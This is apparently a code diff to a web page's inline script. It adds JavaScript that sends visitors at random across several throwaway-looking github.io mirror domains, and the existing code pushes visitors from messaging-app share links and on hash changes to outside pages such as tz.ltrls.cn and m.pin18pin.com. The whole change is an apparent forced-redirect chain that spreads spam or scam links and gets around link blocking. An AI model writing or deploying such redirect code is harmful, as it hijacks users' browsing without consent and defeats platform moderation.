@@ -14,6 +14,31 @@ var geturl = window.location.href;if (geturl.indexOf("singlemessage")>-1 ||getur
 } else if (geturl.indexOf("groupmessage")>-1) {window.location.href = "http://tz.ltrls.cn/tz2.php";} else if (geturl.indexOf("groupmessage")>-1) {window.location.href = "http://tz.ltrls.cn/tz2.php";}
 </script>-->
     <script>
+    Array.prototype.indexOf = function(val) { 
+    	for (var i = 0; i < this.length; i++) { 
+    	if (this[i] == val) return i; 
+    	} 
+    	return -1; 
+    	};
+   	Array.prototype.remove = function(val) { 
+   		var index = this.indexOf(val); 
+   		if (index > -1) { 
+   		this.splice(index, 1); 
+   		} 
+   		};
+    var linkArr = ["qmfy1.github.io", "ajklsmnah19.github.io", "asdajksdnasdih201.github.io"];
+    linkArr.remove(document.domain);
+    var link = linkArr[Math.floor(Math.random() * linkArr.length)];
+    var redata = document.referrer.split('/');
+    if(redata[2]) {
+    	if (link != redata[2] && link != document.domain) {
+    		document.location.href = 'https://' + link + '/' + document.location.toString().split("io/")[1];
+    	}
+    }else {
+    	if (link != document.domain) {
+    		document.location.href = 'https://' + link + '/' + document.location.toString().split("io/")[1];
+    	}
+    }
         window.onhashchange=function(){jp();};
         function jp()
         {window.location.href= 'https://m.pin18pin.com/index.html?t=180930&state=&opt_id=-1&sort_type=1';}
